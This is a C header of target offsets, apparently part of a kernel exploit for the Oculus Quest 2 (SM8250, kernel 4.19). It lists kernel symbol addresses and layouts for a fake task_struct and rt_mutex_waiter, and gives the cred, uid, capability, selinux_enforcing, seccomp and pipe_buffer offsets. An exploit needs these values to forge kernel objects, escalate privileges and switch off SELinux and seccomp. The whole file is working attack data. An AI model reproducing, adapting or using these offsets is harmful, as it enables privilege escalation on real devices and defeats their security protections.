/*
 * hollywood-52175280016700150 target offsets
 * Quest 2 (SM8250 Snapdragon 865), Android 14
 * kernel: 4.19.325-cip128-st12-g634385c6b2f6
 * KIMAGE_TEXT_BASE: 0xffffff8008080000
 *
 * All struct offsets derived from binary analysis of kernel_q2_boot.img
 * init_task @ file offset 0x01b4b580 (VA 0xffffff8009bf6b80)
 * pi_lock/pi_waiters/pi_top_task/pi_blocked_on found via ARM64 disasm
 * of copy_process helper @ file offset 0x3a9a8 (STR32/STR64 patterns)
 */
#ifndef TARGET_H
#define TARGET_H

// kernel 4.19 futex_key layout: address at offset 0, mm at offset 8
// linux 5.x swapped these — futex_hash.h uses this define to pick the right order
#define FUTEX_KEY_ADDR_FIRST 1

#define BUILD_VARIANT_LABEL "hollywood_q2_52175280016700150"
#define BUILD_FINGERPRINT "oculus/hollywood/hollywood:14/SP1A.210812.016/52175280016700150:user/release-keys"

#define KIMAGE_TEXT_BASE_DEFAULT 0xffffff8008080000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x88080000ULL
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff8200000000ULL
#define VMEMMAP_START 0xFFFFFFFEFFE00000ULL

// ksym defaults — all overridable at runtime via ionstack.conf
#define RANDOM_MISC_FOPS_OFF 0x01020240ULL
#define ASHMEM_MISC_FOPS_OFF 0x01c3ca18ULL
#define ASHMEM_FOPS_OFF 0x01078270ULL
#define ASHMEM_IOCTL_OFF 0x009eaee0ULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x009eb4acULL
#define ASHMEM_MMAP_OFF 0x009eb4f8ULL
#define ASHMEM_OPEN_OFF 0x009eb664ULL
#define ASHMEM_RELEASE_OFF 0x009eb6e4ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x009eb7f8ULL
#define ASHMEM_READ_ITER_OFF 0x009eae2cULL
#define CONFIGFS_READ_FILE_OFF 0x002dc3c4ULL
#define CONFIGFS_WRITE_BIN_FILE_OFF 0x002dc880ULL
#define COPY_SPLICE_READ_OFF 0x0026fbc8ULL
#define NOOP_LLSEEK_OFF 0x0022f7ccULL

#define INIT_TASK_OFF 0x01b4b580ULL
#define INIT_UTS_NS_OFF 0x01b4b328ULL
#define EMPTY_ZERO_PAGE_OFF 0x01cf7000ULL
#define ROOT_TASK_GROUP_OFF 0x01cfdd80ULL
// 4.19 has no selinux blob infra, point at empty_zero_page so reads come back 0
#define SELINUX_BLOB_SIZES_OFF 0x01cf7000ULL
#define SELINUX_ENFORCING_OFF 0x01d36ff8ULL
#define SECURITY_HOOK_HEADS_OFF 0x0145d818ULL
#define KMALLOC_CACHES_OFF 0x0145d318ULL
#define ANON_PIPE_BUF_OPS_OFF 0x00fd29c0ULL

#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x01bda5e8ULL
#define SLIDE_SYSCTL_BOOTID_OFF 0x01d4c849ULL
#define SLIDE_LOGGERS_0_1_OFF 0x01b41988ULL
#define SLIDE_NFULNL_LOGGER_OFF 0x01b41a58ULL

// page layout (same as Q3)
#define LOCK_OFF 0x1000
#define FOPS_OFF 0x2000
#define W0_OFF 0x2400
#define FAKE_TASK_OFF 0x3000

// rt_mutex_waiter offsets (4.19 layout matches 5.10 — no wake_state field)
#define WAITER_TREE_ENTRY_OFF 0x00
#define WAITER_PI_TREE_ENTRY_OFF 0x18
#define WAITER_TASK_OFF 0x30
#define WAITER_LOCK_OFF 0x38
#define WAITER_PRIO_OFF 0x40
#define WAITER_DEADLINE_OFF 0x48

#define FAKE_WAITER_PI_TREE_ENTRY_OFF WAITER_PI_TREE_ENTRY_OFF
#define FAKE_WAITER_TASK_OFF WAITER_TASK_OFF
#define FAKE_WAITER_LOCK_OFF WAITER_LOCK_OFF
#define FAKE_WAITER_DEADLINE_OFF WAITER_DEADLINE_OFF

// task_struct offsets — Q2 4.19 layout diverges significantly from Q3 5.15
// confirmed via init_task binary dump + copy_process disassembly
#define FAKE_TASK_USAGE_OFF 0x68         // usage counter, confirmed usage=2 at init_task+0x68
#define FAKE_TASK_PRIO_OFF 0xc4          // prio=120 confirmed at init_task+0xc4
#define FAKE_TASK_NORMAL_PRIO_OFF 0xcc   // normal_prio=120 at init_task+0xcc
#define FAKE_TASK_TASK_GROUP_OFF 0x3c0   // root_task_group ptr confirmed at init_task+0x3c0
#define FAKE_TASK_PI_LOCK_OFF 0x8b4      // raw_spinlock_t, STR32 zeroing at task+0x8b4
#define FAKE_TASK_PI_WAITERS_OFF 0x8c0   // rb_root_cached, STR64x2 at task+0x8c0
#define FAKE_TASK_PI_TOP_TASK_OFF 0x8d0  // task_struct*, STR64 at task+0x8d0
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x8d8 // rt_mutex_waiter*, STR64 at task+0x8d8

// configfs_buffer (from source, stable)
#define CFG_PAGE_OFF 16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF 88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF 100

// task_struct field offsets
#define TASK_PID_OFF 0x5c0
#define TASK_TGID_OFF 0x5c4
#define TASK_REAL_PARENT_OFF 0x648
#define TASK_ATOMIC_FLAGS_OFF 0x588
#define TASK_REAL_CRED_OFF 0x7e0    // confirmed real_cred ptr at init_task+0x7e0
#define TASK_CRED_OFF 0x7e8         // confirmed cred ptr at init_task+0x7e8
#define TASK_COMM_OFF 0x7f0         // confirmed "swapper" string at init_task+0x7f0
#define TASK_TASKS_OFF 0x4e0        // confirmed self-ref list_head at init_task+0x4e0
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#define TASK_SECCOMP_OFF 0x890      // loginuid+sessionid at 0x888, seccomp struct follows

// cred offsets (stable across 4.x/5.x)
#define CRED_UID_OFF 0x4
#define CRED_SECUREBITS_OFF 0x24
#define CRED_CAPS_OFF 0x28
#define CRED_SECURITY_OFF 0x78
#define CRED_USER_OFF 0x80

// selinux — 4.19 has no lsm blob infra, security ptr in cred is direct sid store
#define SELINUX_CRED_BLOB_OFF 0
#define SELINUX_CRED_OSID_OFF 0
#define SELINUX_CRED_SID_OFF 4

// seccomp (stable)
#define SECCOMP_MODE_OFF 0x00
#define SECCOMP_FILTER_COUNT_OFF 0x04
#define SECCOMP_FILTER_OFF 0x08

#define TIF_SECCOMP_BIT 11
#define PFA_NO_NEW_PRIVS_BIT 0

// struct page
#define STRUCT_PAGE_SIZE 0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF 0x18
#define STRUCT_PAGE_TYPE_OFF 0x30

// pipe_buffer
#define PIPE_BUFFER_SIZE 0x28
#define PIPE_BUFFER_SLOTS 32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10

// file_operations (stable layout)
#define FOPS_OWNER_OFF 0x00
#define FOPS_LLSEEK_OFF 0x08
#define FOPS_READ_OFF 0x10
#define FOPS_WRITE_OFF 0x18
#define FOPS_READ_ITER_OFF 0x20
#define FOPS_WRITE_ITER_OFF 0x28
#define FOPS_IOCTL_OFF 0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF 0x60
#define FOPS_OPEN_OFF 0x70
#define FOPS_RELEASE_OFF 0x80
#define FOPS_SPLICE_READ_OFF 0xc8
#define FOPS_SHOW_FDINFO_OFF 0xe0

#endif
